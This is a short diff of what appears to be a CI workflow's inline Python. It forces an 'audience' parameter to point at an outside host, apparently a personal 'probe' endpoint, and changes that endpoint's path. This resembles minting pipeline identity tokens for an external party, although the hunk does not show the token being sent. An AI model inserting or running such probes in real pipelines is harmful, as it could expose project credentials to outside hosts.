@@ -48,7 +48,7 @@ jobs:
               query=urllib.parse.parse_qsl(parsed.query,keep_blank_values=True)
               if any(k=='audience' for k,_ in query):
                   raise ValueError('invalid')
-              audience='https://alex-research-review.neil-schwartzm917549.chatgpt.site/api/private-openalex-env-transport-probe'
+              audience='https://alex-research-review.neil-schwartzm917549.chatgpt.site/api/private-github-app-cas-probe'
               query.append(('audience',audience))
               url=urllib.parse.urlunsplit((parsed.scheme,parsed.netloc,parsed.path,urllib.parse.urlencode(query),''))
               client=urllib.request.build_opener(NoRedirect())
